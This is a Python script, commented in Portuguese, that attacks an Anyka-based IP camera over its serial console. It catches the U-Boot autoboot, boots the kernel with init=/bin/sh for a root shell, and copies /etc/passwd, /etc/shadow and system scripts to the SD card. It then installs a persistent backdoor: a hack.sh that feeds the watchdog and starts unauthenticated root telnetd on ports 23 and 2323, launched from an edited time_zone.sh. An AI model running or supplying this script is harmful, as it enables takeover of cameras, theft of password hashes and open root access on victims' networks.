#!/usr/bin/env python3
"""
U-BOOT HACK - Intercepta o autoboot (1s janela) pra cair no shell U-Boot.
De la: modifica bootargs pra init=/bin/sh (shell puro sem IPC).
"""
import serial
import time
import sys

PORT = '/dev/ttyUSB0'
BAUD = 115200


def send_uboot(ser, cmd, wait=1.5):
    """Envia comando pro U-Boot e retorna resposta"""
    ser.reset_input_buffer()
    time.sleep(0.1)
    ser.write((cmd + '\r\n').encode())
    time.sleep(wait)
    data = ser.read(16384)
    return data.decode('utf-8', errors='replace') if data else ''


def main():
    ser = serial.Serial(PORT, BAUD, timeout=0.1)
    ser.reset_input_buffer()

    print("=" * 60)
    print("  U-BOOT INTERCEPTOR")
    print("  Desliga e religa a camera AGORA!")
    print("  Vou spammar teclas pra pegar o autoboot")
    print("=" * 60, flush=True)

    buf = b''
    start = time.time()
    uboot_caught = False

    # FASE 1: Spam ULTRA agressivo - manda espaco a cada 10ms SEM PARAR
    # A ideia eh que quando o U-Boot chegar no "Hit any key",
    # ja tem espaços no buffer serial esperando
    uboot_phase = False
    while time.time() - start < 120:
        # Spam ultra agressivo: 3 espacos por ciclo
        ser.write(b'   ')

        # Le sem bloquear muito
        data = ser.read(1024)
        if data:
            buf += data
            text = data.decode('utf-8', errors='replace')

            # Mostra so linhas importantes
            for line in text.split('\n'):
                l = line.strip()
                if l and any(x in l for x in ['U-Boot', 'Hit', 'DRAM', 'MiB', 'SF:', 'Booting', 'Starting', 'ak39', '=>']):
                    print(f'  {l[:100]}', flush=True)

            # U-Boot apareceu - intensifica spam
            if b'U-Boot' in buf[-1000:] and not uboot_phase:
                uboot_phase = True
                print('>>> U-Boot detectado! Spam intenso!', flush=True)

            # Detecta prompt U-Boot (varias formas)
            tail = buf[-300:]
            if any(x in tail for x in [b'ak39', b'anyka#', b'=> ', b'AK39']):
                # Confirma mandando Enter
                ser.write(b'\r\n')
                time.sleep(0.5)
                extra = ser.read(4096)
                if extra:
                    buf += extra
                    etext = extra.decode('utf-8', errors='replace')
                    print(etext, flush=True)

                tail2 = buf[-300:]
                if any(x in tail2 for x in [b'ak39', b'anyka#', b'=> ', b'AK39']):
                    print('\n>>> U-BOOT SHELL CAPTURADO! <<<', flush=True)
                    uboot_caught = True
                    break

            # Se ja passou pro kernel, perdemos
            if b'Starting kernel' in buf[-300:]:
                print('\n>>> KERNEL INICIOU - perdemos a janela <<<', flush=True)
                print('Desliga/religa de novo!', flush=True)
                # Reseta pra tentar de novo
                buf = b''
                uboot_phase = False
                # Continua tentando (camera pode reiniciar de novo)

        # Delay minimo entre ciclos
        time.sleep(0.01)  # 10ms = ~100 espacos/segundo

    if not uboot_caught:
        print("\nNao conseguiu pegar U-Boot. Tenta de novo.")
        ser.close()
        return

    # FASE 2: Estamos no U-Boot!
    time.sleep(1)
    ser.read(8192)

    print("\n" + "=" * 60)
    print("[U-BOOT] Coletando info do ambiente...")
    print("=" * 60, flush=True)

    # Mostra ambiente atual
    resp = send_uboot(ser, 'printenv', 3)
    print(resp, flush=True)

    # Salva bootargs original
    resp = send_uboot(ser, 'printenv bootargs')
    print(f'\nBootargs atual: {resp}', flush=True)

    # FASE 3: Modificar bootargs pra init=/bin/sh
    # Isso faz o kernel bootar direto num shell root SEM iniciar nenhum servico
    print("\n" + "=" * 60)
    print("[U-BOOT] Modificando bootargs para init=/bin/sh")
    print("Isso da shell root PURO sem IPC/watchdog/nada")
    print("=" * 60, flush=True)

    # Pega bootargs atual e modifica
    # Original tipico: console=ttySAK0,115200n8 root=/dev/mtdblock5 rootfstype=squashfs init=/sbin/init ...
    # Queremos trocar init=/sbin/init por init=/bin/sh
    resp = send_uboot(ser, 'printenv bootargs')

    # Seta novo bootargs com init=/bin/sh
    new_bootargs = 'setenv bootargs console=ttySAK0,115200n8 root=/dev/mtdblock5 rootfstype=squashfs init=/bin/sh mem=64M'
    resp = send_uboot(ser, new_bootargs)
    print(f'setenv: {resp}', flush=True)

    # Confirma
    resp = send_uboot(ser, 'printenv bootargs')
    print(f'Novo bootargs: {resp}', flush=True)

    # NAO faz saveenv! Isso eh temporario - so pra esse boot
    print('\n[!] NAO salvei no env flash - so vale pra esse boot', flush=True)

    # FASE 4: Boot!
    print("\n" + "=" * 60)
    print("[U-BOOT] Bootando com init=/bin/sh...")
    print("=" * 60, flush=True)

    ser.write(b'boot\r\n')

    # Espera kernel bootar e cair no shell
    buf2 = b''
    start2 = time.time()
    shell_ready = False

    while time.time() - start2 < 30:
        data = ser.read(4096)
        if data:
            buf2 += data
            text = data.decode('utf-8', errors='replace')
            sys.stdout.write(text)
            sys.stdout.flush()

            # init=/bin/sh da um shell # direto
            if b'/ #' in buf2[-100:] or b'~ #' in buf2[-100:] or b'sh: can' in buf2[-200:]:
                print('\n\n>>> ROOT SHELL PURO! <<<', flush=True)
                shell_ready = True
                break

    if not shell_ready:
        # Tenta Enter
        ser.write(b'\r\n')
        time.sleep(1)
        data = ser.read(4096)
        if data:
            text = data.decode('utf-8', errors='replace')
            print(text)
            if '#' in text:
                shell_ready = True
                print('>>> SHELL DETECTADO! <<<', flush=True)

    if not shell_ready:
        print('\nShell nao apareceu. Verificando...', flush=True)
        ser.write(b'\r\n')
        time.sleep(2)
        ser.write(b'echo SHELL_TEST\r\n')
        time.sleep(2)
        data = ser.read(8192)
        text = data.decode('utf-8', errors='replace')
        print(text[:500])

    # FASE 5: Shell root puro - sem IPC, sem watchdog, sem nada!
    print("\n" + "=" * 60)
    print("[SHELL PURO] Executando hack sem interferencia!")
    print("=" * 60, flush=True)

    # Monta filesystems necessarios
    setup_cmds = [
        ("Mount proc",     "mount -t proc proc /proc"),
        ("Mount sys",      "mount -t sysfs sys /sys"),
        ("Mount devpts",   "mkdir -p /dev/pts; mount -t devpts devpts /dev/pts"),
        ("Mount jffs2",    "mount -t jffs2 /dev/mtdblock5 /rom 2>/dev/null; mount -t jffs2 /dev/mtdblock6 /rom 2>/dev/null"),
        ("Mount ipc",      "mount -t squashfs /dev/mtdblock6 /ipc 2>/dev/null; mount -t squashfs /dev/mtdblock7 /ipc 2>/dev/null"),
        ("Mount tmpfs",    "mount -t tmpfs tmpfs /tmp"),
        ("Mount SD",       "mkdir -p /mnt/disc1; mount /dev/mmcblk0p1 /mnt/disc1 2>/dev/null; mount /dev/mmcblk0 /mnt/disc1 2>/dev/null"),
    ]

    for desc, cmd in setup_cmds:
        resp = send_uboot(ser, cmd, 2)
        clean = [l for l in resp.split('\n') if l.strip() and '#' not in l[:3]]
        print(f'  [{desc}] {" ".join(clean)[:100]}', flush=True)

    # Info do sistema
    info_cmds = [
        ("ID",       "id"),
        ("Mount",    "mount"),
        ("MTD",      "cat /proc/mtd"),
        ("DF",       "df -h"),
        ("LS rom",   "ls -la /rom/"),
        ("LS SD",    "ls -la /mnt/disc1/"),
    ]

    for desc, cmd in info_cmds:
        resp = send_uboot(ser, cmd, 2)
        print(f'\n--- {desc} ---\n{resp}', flush=True)

    # Dumps pro SD (agora sem IPC interferindo!)
    SD = '/mnt/disc1'
    dumps = [
        f"id > {SD}/id.txt",
        f"cp /etc/passwd {SD}/passwd.txt",
        f"cp /etc/shadow {SD}/shadow.txt",
        f"cat /etc/inittab > {SD}/inittab.txt",
        f"cat /etc/init.d/rc.local > {SD}/rc_local.txt",
        f"cat /etc/init.d/rcS > {SD}/rcS.txt",
        f"cat /ipc/setup.sh > {SD}/setup.txt 2>/dev/null",
        f"mount > {SD}/mount.txt",
        f"cat /proc/mtd > {SD}/mtd.txt",
        f"cat /proc/cpuinfo > {SD}/cpuinfo.txt",
        f"cat /proc/cmdline > {SD}/cmdline.txt",
        f"dmesg > {SD}/dmesg.txt 2>/dev/null",
        f"ls -laR /rom/ > {SD}/rom_list.txt",
        f"ls -laR /etc/jffs2/ > {SD}/jffs2_list.txt 2>/dev/null",
    ]

    print("\n[DUMPS]", flush=True)
    for cmd in dumps:
        resp = send_uboot(ser, cmd, 2)
        name = cmd.split('/')[-1].split(' ')[0]
        print(f'  {name}', flush=True)

    # ROM dump detalhado
    send_uboot(ser, f"for f in /rom/*; do echo =$f; cat $f 2>/dev/null; done > {SD}/rom_all.txt", 5)
    send_uboot(ser, f"for f in /etc/init.d/*; do echo =$f; cat $f; done > {SD}/initd_all.txt", 5)
    print('  rom_all + initd_all', flush=True)

    # Hack persistente
    print("\n[HACK PERSISTENTE]", flush=True)

    send_uboot(ser, "echo '#!/bin/sh' > /rom/hack.sh", 1)
    send_uboot(ser, "echo '(while true;do echo V>/dev/watchdog 2>/dev/null;sleep 1;done)&' >> /rom/hack.sh", 1)
    send_uboot(ser, "echo 'telnetd -l /bin/sh &' >> /rom/hack.sh", 1)
    send_uboot(ser, "echo 'telnetd -l /bin/sh -p 2323 &' >> /rom/hack.sh", 1)
    send_uboot(ser, "chmod +x /rom/hack.sh", 1)
    print('  hack.sh criado', flush=True)

    # Inject no time_zone.sh
    send_uboot(ser, "grep -q hack /rom/time_zone.sh 2>/dev/null || echo '/rom/hack.sh &' >> /rom/time_zone.sh", 2)
    print('  time_zone.sh injetado', flush=True)

    # Verifica
    resp = send_uboot(ser, "cat /rom/hack.sh", 2)
    print(f'\nhack.sh:\n{resp}', flush=True)

    resp = send_uboot(ser, "cat /rom/time_zone.sh 2>/dev/null", 2)
    print(f'\ntime_zone.sh:\n{resp}', flush=True)

    # Salva verificacao
    send_uboot(ser, f"cat /rom/hack.sh > {SD}/hack_check.txt", 1)
    send_uboot(ser, f"cat /rom/time_zone.sh > {SD}/tz_check.txt 2>/dev/null", 1)
    send_uboot(ser, f"echo HACK_V4_COMPLETE > {SD}/SUCCESS.txt; date >> {SD}/SUCCESS.txt 2>/dev/null", 1)

    print("\n" + "=" * 60)
    print("  HACK VIA U-BOOT COMPLETO!")
    print("")
    print("  Shell root PURO sem IPC interferindo.")
    print("  Dumps salvos no SD card.")
    print("  Hack persistente em /rom/hack.sh")
    print("")
    print("  Pra reiniciar normal: desliga/religa camera")
    print("  (bootargs volta ao original pois nao salvou)")
    print("=" * 60)

    # Shell interativo?
    print("\nEntrando em modo interativo (Ctrl+C pra sair)...")
    try:
        while True:
            cmd = input("cam# ")
            if cmd.strip():
                resp = send_uboot(ser, cmd, 2)
                print(resp)
    except (KeyboardInterrupt, EOFError):
        pass

    ser.close()


if __name__ == '__main__':
    main()
